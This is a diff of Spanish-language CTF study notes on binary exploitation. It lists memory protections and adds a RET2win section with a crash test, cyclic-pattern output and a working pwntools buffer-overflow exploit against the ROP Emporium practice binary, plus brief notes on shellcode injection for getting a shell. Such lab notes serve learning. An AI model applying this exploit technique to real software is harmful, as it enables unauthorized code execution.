@@ -1,18 +1,3 @@
----
-layout:
-  width: default
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Pwn (WIP)
 
 ## Binario
@@ -97,10 +82,10 @@ x86.syscall.sh
 xor rsi,rsi --> hacer \
 
 
-## <mark style="color:red;">PWN</mark>
+## <mark style="color:red;">P</mark>rotecciones
 
-protecciones\
-NX — evita ejecutar codigo shellcodeen stack o heap\
+\
+NX — evita ejecutar codigo shellcode en stack o heap\
 Canary — Evita sobreescritura del retorno, compara un valor aleatorio y si ha cambiado no deja que se ejecute el binario, evita bufferoverflow\
 PIE — Aleatoriza las posiciones de memoria, excepto las ultimas 3\
 RELRO — Proteger la GOT de sobreescritura\
@@ -112,3 +97,70 @@ herramientas [https://github.com/apogiatzis/gdb-peda-pwndbg-gef](https://github.
 
 {% embed url="https://ropemporium.com/" %}
 
+## RET2win
+
+Hacer un bufferoverflow para llegar a la funcion de retorno de la funcion, con el fin de redigirigirlo a una direcccion de memoeria arbitraria
+
+checksec
+
+vnmap
+
+
+
+run
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+
+
+
+cyclic 100
+
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+
+
+
+
+
+
+
+{% code overflow="wrap" lineNumbers="true" %}
+```python
+#!/usr/bin/python3
+from pwn import *
+gs = '''
+continue
+'''
+elf = context.binary = ELF('./ret2win')
+context.terminal = ['kitty']
+
+def start():
+    if args.GDB:
+        return gdb.debug('./ret2win', gdbscript=gs)
+    if args.REMOTE:
+        return remote('127.0.0.1', 5555)
+    else:
+        return process('./ret2win')
+r = start()
+#========= exploit here ===================
+
+payload = b'A' * 40  # Padding to reach the return address
+win = p64(0x000000000040075a)  # Address of the win function
+r.sendlineafter(b'>', payload + win)
+
+
+#========= interactive ====================
+r.interactive()
+```
+{% endcode %}
+
+## Shellcode Injection
+
+no tiene proteccion NX&#x20;
+
+que quiero hacer para la ejecucion
+
+Que no puedo usar para la ejecucion y la longitud
+
+crear shellcode (set the instrucciones en assembly) para obtener una sheel y ya&#x20;
